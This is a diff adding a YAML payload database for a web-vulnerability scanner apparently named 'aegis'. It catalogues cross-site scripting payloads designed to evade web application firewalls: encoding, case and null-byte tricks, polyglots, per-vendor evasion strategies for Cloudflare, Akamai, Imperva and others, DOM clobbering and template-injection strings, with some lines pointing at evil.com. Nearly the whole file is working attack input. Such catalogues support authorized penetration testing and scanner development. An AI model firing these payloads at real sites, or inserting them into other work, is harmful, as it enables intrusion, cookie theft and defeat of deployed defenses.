@@ -1,0 +1,585 @@
+# ==============================================================================
+# WAF Bypass Payload Database v1.0
+# ==============================================================================
+# Comprehensive payload database for WAF bypass testing
+# Organized by element type, WAF vendor, and encoding technique
+#
+# Usage:
+#   aegis scan --waf-bypass --target https://example.com
+#   aegis scan --waf-type cloudflare --element-focus script,img
+#
+# Last Updated: 2026-02-05
+# ==============================================================================
+
+version: "1.0"
+last_updated: "2026-02-05"
+
+# ==============================================================================
+# SCRIPT TAG PAYLOADS
+# ==============================================================================
+script_payloads:
+  basic:
+    - value: '<script>alert(1)</script>'
+      description: "Basic script alert"
+      confidence: 30
+
+    - value: '<script>alert(document.domain)</script>'
+      description: "Domain disclosure"
+      confidence: 30
+
+    - value: '<script>alert(document.cookie)</script>'
+      description: "Cookie disclosure"
+      confidence: 30
+
+  waf_bypass:
+    # Case variation
+    - value: '<ScRiPt>alert(1)</ScRiPt>'
+      description: "Mixed case bypass"
+      confidence: 50
+      targets: [modsecurity, nginx-naxsi]
+
+    - value: '<SCRIPT>alert(1)</SCRIPT>'
+      description: "Uppercase bypass"
+      confidence: 50
+
+    # Whitespace injection
+    - value: '<script >alert(1)</script>'
+      description: "Space after tag"
+      confidence: 55
+
+    - value: '<script\t>alert(1)</script>'
+      description: "Tab whitespace bypass"
+      confidence: 60
+      targets: [cloudflare, akamai]
+
+    - value: '<script\n>alert(1)</script>'
+      description: "Newline whitespace"
+      confidence: 60
+
+    - value: '<script\r>alert(1)</script>'
+      description: "CR whitespace"
+      confidence: 60
+
+    - value: '<script\x0c>alert(1)</script>'
+      description: "Form feed whitespace"
+      confidence: 65
+
+    # Comment insertion
+    - value: '<script>/**/alert(1)</script>'
+      description: "Empty comment bypass"
+      confidence: 55
+
+    - value: '<script>alert/*comment*/(1)</script>'
+      description: "Comment in function call"
+      confidence: 60
+      targets: [modsecurity]
+
+    # Tag breaking
+    - value: '</script><script>alert(1)</script>'
+      description: "Close and reopen tag"
+      confidence: 65
+
+    - value: '<script>alert(1)</script//>'
+      description: "Double slash close"
+      confidence: 50
+
+    # Null byte injection
+    - value: '<scr\x00ipt>alert(1)</scr\x00ipt>'
+      description: "Null byte in tag"
+      confidence: 65
+      targets: [modsecurity, nginx-naxsi, wordfence]
+
+    # SVG wrapper
+    - value: '<svg><script>alert(1)</script></svg>'
+      description: "SVG wrapped script"
+      confidence: 70
+      targets: [cloudflare, akamai]
+
+    # Template literals
+    - value: '<script>alert`1`</script>'
+      description: "Template literal call"
+      confidence: 70
+      targets: [akamai, cloudflare, imperva]
+
+    - value: '<script>alert`${document.domain}`</script>'
+      description: "Template literal with expression"
+      confidence: 70
+
+    # Constructor chain
+    - value: '<script>[].constructor.constructor("alert(1)")()</script>'
+      description: "Array constructor chain"
+      confidence: 75
+      targets: [cloudflare, akamai, imperva]
+
+    - value: '<script>"".constructor.constructor("alert(1)")()</script>'
+      description: "String constructor chain"
+      confidence: 75
+
+    - value: '<script>window["al"+"ert"](1)</script>'
+      description: "String concatenation"
+      confidence: 60
+
+    - value: '<script>window["eval"]("alert(1)")</script>'
+      description: "Bracket notation eval"
+      confidence: 65
+
+    # Encoded variants
+    - value: '<script>eval(atob("YWxlcnQoMSk="))</script>'
+      description: "Base64 encoded payload"
+      confidence: 65
+
+    - value: '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>'
+      description: "CharCode encoded"
+      confidence: 70
+      targets: [cloudflare, akamai]
+
+  csp_bypass:
+    - value: '<script src="/api?callback=alert"></script>'
+      description: "JSONP callback injection"
+      confidence: 50
+
+    - value: '<base href="//evil.com/"><script src="/safe.js"></script>'
+      description: "Base tag hijacking"
+      confidence: 55
+
+    - value: '<script nonce="{{nonce}}">alert(1)</script>'
+      description: "Nonce placeholder"
+      confidence: 30
+
+# ==============================================================================
+# IMG TAG PAYLOADS
+# ==============================================================================
+img_payloads:
+  basic:
+    - value: '<img src=x onerror=alert(1)>'
+      description: "Basic img onerror"
+      confidence: 35
+
+    - value: '<img src=x onerror="alert(1)">'
+      description: "Quoted onerror"
+      confidence: 35
+
+    - value: '<img/src=x onerror=alert(1)>'
+      description: "Slash separator"
+      confidence: 40
+
+  waf_bypass:
+    # Slash tricks
+    - value: '<img/src/onerror=alert(1)>'
+      description: "Double slash trick"
+      confidence: 60
+      targets: [modsecurity, nginx-naxsi]
+
+    - value: '<img src=x\tonerror=alert(1)>'
+      description: "Tab separator"
+      confidence: 65
+
+    # Backtick call
+    - value: '<img src=x onerror=alert`1`>'
+      description: "Backtick function call"
+      confidence: 70
+      targets: [cloudflare, akamai, imperva]
+
+    # HTML entity encoding
+    - value: '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>'
+      description: "Decimal HTML entities"
+      confidence: 70
+      targets: [akamai, cloudflare]
+
+    - value: '<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>'
+      description: "Hex HTML entities"
+      confidence: 70
+
+    - value: '<img src=x onerror=\u0061lert(1)>'
+      description: "Unicode escape sequence"
+      confidence: 65
+
+    # Mixed quotes
+    - value: "<img src='x' onerror=\"alert(1)\">"
+      description: "Mixed quote styles"
+      confidence: 50
+
+    - value: '<img src=x onerror=alert(1)//>'
+      description: "Comment close trick"
+      confidence: 55
+
+    # SVG image
+    - value: '<svg><image xlink:href=x onerror=alert(1)>'
+      description: "SVG image element"
+      confidence: 70
+      targets: [cloudflare]
+
+    # Data URL
+    - value: '<img src="data:x,x" onerror=alert(1)>'
+      description: "Data URL error trigger"
+      confidence: 55
+
+    # Loading attribute
+    - value: '<img loading=lazy src=x onerror=alert(1)>'
+      description: "Lazy loading with error"
+      confidence: 50
+
+    # Filter evasion
+    - value: '<<img src=x onerror=alert(1)>'
+      description: "Double bracket"
+      confidence: 55
+
+    - value: '<img/src="x"/onerror="alert(1)">'
+      description: "Slash quoted attributes"
+      confidence: 50
+
+    # Constructor bypass
+    - value: '<img src=x onerror=window.onerror=alert;throw+1>'
+      description: "Window onerror assignment"
+      confidence: 65
+
+    - value: '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>'
+      description: "Base64 in onerror"
+      confidence: 70
+
+    # Animation events
+    - value: '<img src=x style="animation:x" onanimationend=alert(1)>'
+      description: "CSS animation event"
+      confidence: 60
+
+# ==============================================================================
+# DIV TAG PAYLOADS
+# ==============================================================================
+div_payloads:
+  basic:
+    - value: '<div onmouseover=alert(1)>XSS</div>'
+      description: "Mouseover handler"
+      confidence: 30
+
+    - value: '<div onclick=alert(1)>Click</div>'
+      description: "Click handler"
+      confidence: 30
+
+  waf_bypass:
+    # Contenteditable
+    - value: '<div contenteditable onblur=alert(1)>Click out</div>'
+      description: "Contenteditable blur"
+      confidence: 55
+
+    - value: '<div contenteditable onfocus=alert(1)>Focus me</div>'
+      description: "Contenteditable focus"
+      confidence: 55
+
+    - value: '<div contenteditable oninput=alert(1)>Type here</div>'
+      description: "Contenteditable input"
+      confidence: 55
+
+    # Auto-trigger events
+    - value: '<div id=x tabindex=1 onfocus=alert(1)></div><a href=#x>Click</a>'
+      description: "Tab focus auto-trigger"
+      confidence: 60
+
+    - value: '<div onpointermove=alert(1)>Move mouse</div>'
+      description: "Pointer move event"
+      confidence: 50
+
+    - value: '<div ontouchstart=alert(1)>Touch</div>'
+      description: "Touch start event"
+      confidence: 45
+
+    # Scroll events
+    - value: '<div style="height:50px;overflow:scroll" onscroll=alert(1)><div style="height:100px">Scroll</div></div>'
+      description: "Scroll trigger"
+      confidence: 55
+
+    # Animation events
+    - value: '<div style="animation:x" onanimationend=alert(1)><style>@keyframes x{}</style></div>'
+      description: "Animation end event"
+      confidence: 60
+
+    - value: '<div style="transition:all 0.001s" ontransitionend=alert(1)>Trans</div>'
+      description: "Transition end event"
+      confidence: 60
+
+    # Drag events
+    - value: '<div draggable=true ondragstart=alert(1)>Drag me</div>'
+      description: "Drag start event"
+      confidence: 50
+
+    # Custom element
+    - value: '<x-div onclick=alert(1)>Click</x-div>'
+      description: "Custom element bypass"
+      confidence: 65
+      targets: [cloudflare, akamai]
+
+    # Context menu
+    - value: '<div oncontextmenu=alert(1)>Right click</div>'
+      description: "Context menu event"
+      confidence: 45
+
+    # Wheel event
+    - value: '<div onwheel=alert(1) style="height:100px;overflow:auto"><div style="height:200px"></div></div>'
+      description: "Wheel scroll event"
+      confidence: 55
+
+# ==============================================================================
+# SPAN TAG PAYLOADS
+# ==============================================================================
+span_payloads:
+  basic:
+    - value: '<span onmouseover=alert(1)>Hover</span>'
+      description: "Mouseover handler"
+      confidence: 30
+
+    - value: '<span onclick=alert(1)>Click</span>'
+      description: "Click handler"
+      confidence: 30
+
+  waf_bypass:
+    # Focus events
+    - value: '<span tabindex=1 onfocus=alert(1)>Focus</span>'
+      description: "Tab focus event"
+      confidence: 50
+
+    - value: '<span tabindex=0 onblur=alert(1)>Blur</span>'
+      description: "Tab blur event"
+      confidence: 50
+
+    # Contenteditable
+    - value: '<span contenteditable oninput=alert(1)>Edit me</span>'
+      description: "Input event"
+      confidence: 55
+
+    - value: '<span contenteditable onpaste=alert(1)>Paste here</span>'
+      description: "Paste event"
+      confidence: 50
+
+    # Keyboard events
+    - value: '<span contenteditable onkeyup=alert(1)>Type</span>'
+      description: "Keyup event"
+      confidence: 50
+
+    - value: '<span contenteditable onkeydown=alert(1)>Type</span>'
+      description: "Keydown event"
+      confidence: 50
+
+    # Pointer events
+    - value: '<span onpointerover=alert(1)>Hover</span>'
+      description: "Pointer over event"
+      confidence: 50
+
+    - value: '<span onpointerdown=alert(1)>Press</span>'
+      description: "Pointer down event"
+      confidence: 50
+
+    # Copy events
+    - value: '<span oncopy=alert(1)>Copy me</span>'
+      description: "Copy event"
+      confidence: 45
+
+    - value: '<span oncut=alert(1) contenteditable>Cut me</span>'
+      description: "Cut event"
+      confidence: 50
+
+    # CSS tricks
+    - value: '<span style="-webkit-user-modify:read-write" onfocus=alert(1)>Focus</span>'
+      description: "Webkit modify bypass"
+      confidence: 55
+
+    # Animation
+    - value: '<span style="animation:x" onanimationstart=alert(1)><style>@keyframes x{}</style></span>'
+      description: "Animation start event"
+      confidence: 55
+
+# ==============================================================================
+# SVG PAYLOADS
+# ==============================================================================
+svg_payloads:
+  basic:
+    - value: '<svg onload=alert(1)>'
+      description: "SVG onload"
+      confidence: 40
+
+    - value: '<svg/onload=alert(1)>'
+      description: "SVG slash onload"
+      confidence: 55
+
+  waf_bypass:
+    - value: '<svg onload=alert`1`>'
+      description: "SVG backtick call"
+      confidence: 70
+
+    - value: '<svg><animate onbegin=alert(1) attributeName=x>'
+      description: "SVG animate element"
+      confidence: 60
+
+    - value: '<svg><set onbegin=alert(1) attributeName=x>'
+      description: "SVG set element"
+      confidence: 60
+
+    - value: '<svg><script>alert(1)</script>'
+      description: "SVG embedded script"
+      confidence: 50
+
+    - value: '<svg><a xlink:href="javascript:alert(1)"><rect width=100 height=100/></a>'
+      description: "SVG xlink protocol"
+      confidence: 55
+
+    - value: '<svg><foreignObject><iframe srcdoc="<script>alert(1)</script>">'
+      description: "SVG foreignObject"
+      confidence: 65
+
+    - value: '<svg><use xlink:href="data:image/svg+xml,<svg onload=alert(1)>"/>'
+      description: "SVG use element"
+      confidence: 60
+
+# ==============================================================================
+# POLYGLOT PAYLOADS
+# ==============================================================================
+polyglot_payloads:
+  - value: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
+    description: "Ultimate polyglot - works in multiple contexts"
+    confidence: 80
+
+  - value: "'\"-->]]>*/</script></style></title></textarea></noscript></template></select><svg/onload=alert()>"
+    description: "Context escape polyglot"
+    confidence: 75
+
+  - value: "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
+    description: "JavaScript context polyglot"
+    confidence: 70
+
+  - value: "-->'\"--></style></script><script>alert(1)</script>"
+    description: "Comment escape polyglot"
+    confidence: 65
+
+  - value: "'\"><img src=x onerror=alert(1)//>"
+    description: "Quote escape polyglot"
+    confidence: 60
+
+# ==============================================================================
+# ENCODING STRATEGIES BY WAF
+# ==============================================================================
+waf_encoding_strategies:
+  cloudflare:
+    primary: [unicode, url]
+    secondary: [case-variation, null-byte]
+    notes: "Cloudflare is sophisticated; use unicode and avoid common keywords"
+
+  akamai:
+    primary: [double-url, mixed-case]
+    secondary: [comment-insertion, parameter-pollution]
+    notes: "Akamai Kona requires creative encoding; try chunked payloads"
+
+  imperva:
+    primary: [whitespace, html-entity]
+    secondary: [mixed-encoding, protocol-variation]
+    notes: "Incapsula/Imperva blocks common patterns; use encoding combinations"
+
+  modsecurity:
+    primary: [comment-insertion, case-variation]
+    secondary: [null-byte, whitespace]
+    notes: "ModSecurity rules can be bypassed with comments and case mixing"
+
+  aws-waf:
+    primary: [double-url, parameter-pollution]
+    secondary: [content-type-confusion, multipart]
+    notes: "AWS WAF has specific rule sets; test HTTP parameter pollution"
+
+  sucuri:
+    primary: [unicode, case-mixing]
+    secondary: [whitespace-injection, protocol-variation]
+    notes: "Sucuri CloudProxy has regex-based rules"
+
+  wordfence:
+    primary: [url-encoding, whitespace]
+    secondary: [parameter-splitting, comment-insertion]
+    notes: "WordPress-specific; test wp-specific contexts"
+
+# ==============================================================================
+# CONTEXT-SPECIFIC PAYLOADS
+# ==============================================================================
+context_payloads:
+  html_context:
+    - '<script>alert(1)</script>'
+    - '<img src=x onerror=alert(1)>'
+    - '<svg onload=alert(1)>'
+
+  attribute_unquoted:
+    - ' onmouseover=alert(1) '
+    - ' onfocus=alert(1) autofocus '
+
+  attribute_single_quote:
+    - "' onmouseover='alert(1)'"
+    - "' onfocus='alert(1)' autofocus '"
+
+  attribute_double_quote:
+    - '" onmouseover="alert(1)"'
+    - '" onfocus="alert(1)" autofocus "'
+
+  javascript_string_single:
+    - "'-alert(1)-'"
+    - "';alert(1)//'"
+    - "\\';alert(1)//'"
+
+  javascript_string_double:
+    - '"-alert(1)-"'
+    - '";alert(1)//"'
+    - '\\";alert(1)//"'
+
+  javascript_template:
+    - '${alert(1)}'
+    - '`${alert(1)}`'
+
+  url_context:
+    - 'javascript:alert(1)'
+    - 'data:text/html,<script>alert(1)</script>'
+    - '//evil.com?'
+
+  css_context:
+    - 'expression(alert(1))'
+    - 'url(javascript:alert(1))'
+    - "};alert(1)//'"
+
+# ==============================================================================
+# DOM CLOBBERING PAYLOADS
+# ==============================================================================
+dom_clobbering_payloads:
+  - value: '<form id=x><input name=y value=z>'
+    description: "Form-based clobbering"
+    target: "document.x.y"
+
+  - value: '<img name=x>'
+    description: "Image name clobbering"
+    target: "document.x"
+
+  - value: '<a id=x href=y>'
+    description: "Anchor href clobbering"
+    target: "x.href"
+
+  - value: '<form id=document><input name=cookie>'
+    description: "Document cookie clobbering"
+    target: "document.cookie"
+
+  - value: '<iframe name=x srcdoc="<a id=y href=z>">'
+    description: "Iframe-based clobbering"
+    target: "x.y.href"
+
+# ==============================================================================
+# TEMPLATE INJECTION PAYLOADS
+# ==============================================================================
+template_injection_payloads:
+  angular:
+    - '{{constructor.constructor("alert(1)")()}}'
+    - '{{$on.constructor("alert(1)")()}}'
+
+  vue:
+    - '{{constructor.constructor("alert(1)")()}}'
+    - '{{_c.constructor("alert(1)")()}}'
+
+  generic:
+    - '${alert(1)}'
+    - '{{7*7}}'
+    - '#{7*7}'
+    - '<%=7*7%>'
+
+  detection:
+    - '{{7*7}}'
+    - '${7*7}'
+    - '#{7*7}'
+    - '[[${7*7}]]'
